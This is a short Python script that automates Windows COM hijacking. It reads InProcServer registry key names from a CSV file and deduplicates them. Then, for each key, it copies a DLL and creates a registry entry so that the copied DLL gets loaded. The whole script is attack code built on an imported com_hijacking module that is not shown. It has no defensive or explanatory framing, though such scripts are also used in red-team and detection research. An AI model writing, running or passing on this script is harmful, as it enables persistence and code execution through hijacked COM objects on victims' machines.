import com_hijacking

# Filename to read from (CSV format)
csv_file = 'InProcServer.CSV'

# The column number to extract (0-indexed)
column_index = 4

extracted_columns = com_hijacking.extract_column(csv_file, column_index)
#Dedup
extracted_columns = [
    com_hijacking.remove_first_word_before_backslash(e) for e in extracted_columns]
extracted_columns = list({element.title() for element in extracted_columns})

num_columns = len(extracted_columns)
for extracted_key, index in zip(extracted_columns, range(num_columns)):
    value_data = com_hijacking.copy_DLL(index)
    com_hijacking.create_registry_key(
        extracted_key, value_data)